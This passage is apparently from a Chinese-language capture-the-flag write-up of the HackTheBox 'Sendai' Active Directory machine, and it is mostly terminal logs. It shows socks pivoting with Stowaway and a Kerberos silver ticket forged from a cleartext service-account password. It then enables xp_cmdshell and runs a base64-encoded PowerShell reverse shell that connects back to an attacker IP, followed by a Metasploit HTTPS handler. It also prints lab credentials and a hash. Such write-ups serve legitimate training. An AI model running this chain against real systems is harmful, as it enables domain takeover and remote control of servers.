+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sendai\mgtsvc$
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">C:\Users\mgtsvc$\Documents&gt;exit
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">exit
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(node 0) &gt;&gt; help
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	help                                            Show help information
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	status                                          Show node status,including socks/forward/backward
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	listen                                          Start port listening on current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	addmemo    &lt;string&gt;                             Add memo for current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	delmemo                                         Delete memo of current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	ssh        &lt;ip:port&gt;                            Start SSH through current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	shell                                           Start an interactive shell on current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	socks      &lt;lport&gt; [username] [pass]            Start a socks5 server
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	stopsocks                                       Shut down socks services
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	connect    &lt;ip:port&gt;                            Connect to a new node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	sshtunnel  &lt;ip:sshport&gt; &lt;agent port&gt;            Use sshtunnel to add the node into our topology
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	upload     &lt;local filename&gt; &lt;remote filename&gt;   Upload file to current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	download   &lt;remote filename&gt; &lt;local filename&gt;   Download file from current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	forward    &lt;lport&gt; &lt;ip:port&gt;                    Forward local port to specific remote ip:port
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	stopforward                                     Shut down forward services
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	backward    &lt;rport&gt; &lt;lport&gt;                     Backward remote port(agent) to local port(admin)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	stopbackward                                    Shut down backward services
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	shutdown                                        Terminate current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	back                                            Back to parent panel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	exit                                            Exit Stowaway
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(node 0) &gt;&gt; socks 5555
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Unknown Command!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	help                                            Show help information
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	status                                          Show node status,including socks/forward/backward
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	listen                                          Start port listening on current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	addmemo    &lt;string&gt;                             Add memo for current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	delmemo                                         Delete memo of current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	ssh        &lt;ip:port&gt;                            Start SSH through current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	shell                                           Start an interactive shell on current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	socks      &lt;lport&gt; [username] [pass]            Start a socks5 server
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	stopsocks                                       Shut down socks services
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	connect    &lt;ip:port&gt;                            Connect to a new node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	sshtunnel  &lt;ip:sshport&gt; &lt;agent port&gt;            Use sshtunnel to add the node into our topology
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	upload     &lt;local filename&gt; &lt;remote filename&gt;   Upload file to current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	download   &lt;remote filename&gt; &lt;local filename&gt;   Download file from current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	forward    &lt;lport&gt; &lt;ip:port&gt;                    Forward local port to specific remote ip:port
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	stopforward                                     Shut down forward services
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	backward    &lt;rport&gt; &lt;lport&gt;                     Backward remote port(agent) to local port(admin)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	stopbackward                                    Shut down backward services
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	shutdown                                        Terminate current node
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	back                                            Back to parent panel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	exit                                            Exit Stowaway
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(node 0) &gt;&gt; socks 5555
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Trying to listen on 0.0.0.0:5555......
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Waiting for agent&#39;</span>s response......
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Socks start successfully!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>node 0<span style="color:#f92672">)</span> &gt;&gt; 
+</span></span></code></pre></div><p>直接连接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ proxychains4 impacket-mssqlclient -windows-auth $user2:$pass2@127.0.0.1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\s</span>qlsvc  guest@master<span style="color:#f92672">)</span>&gt; <span style="color:#66d9ef">select</span> @@servername
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>-------------   
+</span></span><span style="display:flex;"><span>DC<span style="color:#ae81ff">\S</span>QLEXPRESS   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\s</span>qlsvc  guest@master<span style="color:#f92672">)</span>&gt; SELECT entity_name, permission_name FROM fn_my_permissions<span style="color:#f92672">(</span>NULL, <span style="color:#e6db74">&#39;SERVER&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>entity_name   permission_name     
+</span></span><span style="display:flex;"><span>-----------   -----------------   
+</span></span><span style="display:flex;"><span>server        CONNECT SQL         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server        VIEW ANY DATABASE   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\s</span>qlsvc  guest@master<span style="color:#f92672">)</span>&gt; 
+</span></span></code></pre></div><p>当前权限不足，还是走捷径吧，懒得查数据库了，我们有密码直接打白银票据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>获取域sid和服务账户hash
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap $ip -u $user2 -p $pass2 --get-sid
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:sendai.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\s</span>qlsvc:SurenessBlob85 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.66   <span style="color:#ae81ff">389</span>    DC               Domain SID S-1-5-21-3085872742-570972823-736764132
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo sid<span style="color:#f92672">=</span>S-1-5-21-3085872742-570972823-736764132&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;</span>$pass2<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span><span style="display:flex;"><span>MD4<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)=</span> 58655c0b90b2492f84fb46fa78c2d96a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo hash2<span style="color:#f92672">=</span>58655c0b90b2492f84fb46fa78c2d96a&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>制作票据
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-ticketer -spn MSSQLSvc/$FQDN -user-id <span style="color:#ae81ff">500</span> Administrator -nthash $hash2 -domain-sid $sid -domain $domain
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating basic skeleton ticket and PAC Infos
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  aTime <span style="color:#f92672">=</span> timegm<span style="color:#f92672">(</span>datetime.datetime.utcnow<span style="color:#f92672">()</span>.timetuple<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Customizing ticket <span style="color:#66d9ef">for</span> sendai.vl/Administrator
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  ticketDuration <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span> + datetime.timedelta<span style="color:#f92672">(</span>hours<span style="color:#f92672">=</span>int<span style="color:#f92672">(</span>self.__options.duration<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  encTicketPart<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;authtime&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> KerberosTime.to_asn1<span style="color:#f92672">(</span>datetime.datetime.utcnow<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  encTicketPart<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;starttime&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> KerberosTime.to_asn1<span style="color:#f92672">(</span>datetime.datetime.utcnow<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_LOGON_INFO
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_CLIENT_INFO_TYPE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  encRepPart<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;last-req&#39;</span><span style="color:#f92672">][</span>0<span style="color:#f92672">][</span><span style="color:#e6db74">&#39;lr-value&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> KerberosTime.to_asn1<span style="color:#f92672">(</span>datetime.datetime.utcnow<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTGSRepPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Signing/Encrypting final ticket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_SERVER_CHECKSUM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_PRIVSVR_CHECKSUM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTGSRepPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator.ccache
+</span></span></code></pre></div><p>搞定，利用admin权限访问数据库</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ export KRB5CCNAME<span style="color:#f92672">=</span>Administrator.ccach
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ proxychains4 impacket-mssqlclient DC.sendai.vl -k -no-pass
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; 
+</span></span></code></pre></div><p>还是没有xpcmd权限，但是只是没有开启，直接开启即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; EXEC sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>,1;
+</span></span><span style="display:flex;"><span>INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; RECONFIGURE;
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; EXEC sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,1;
+</span></span><span style="display:flex;"><span>INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; RECONFIGURE;
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; EXEC xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span>output          
+</span></span><span style="display:flex;"><span>-------------   
+</span></span><span style="display:flex;"><span>sendai<span style="color:#ae81ff">\s</span>qlsvc   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NULL            
+</span></span></code></pre></div><p>利用powershell反弹shell回来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SENDAI<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; EXEC xp_cmdshell <span style="color:#e6db74">&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">80</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.23<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.234.66<span style="color:#f92672">]</span> <span style="color:#ae81ff">57968</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>sendai<span style="color:#ae81ff">\s</span>qlsvc
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; 
+</span></span></code></pre></div><p>shell加强，上线msf,顺便利用msf进程迁移稳定一些</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started HTTPS reverse handler on https://10.10.16.23:4444
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> https://10.10.16.23:4444 handling request from 10.129.234.66; <span style="color:#f92672">(</span>UUID: ronoammx<span style="color:#f92672">)</span> Without a database connected that payload UUID tracking will not work!
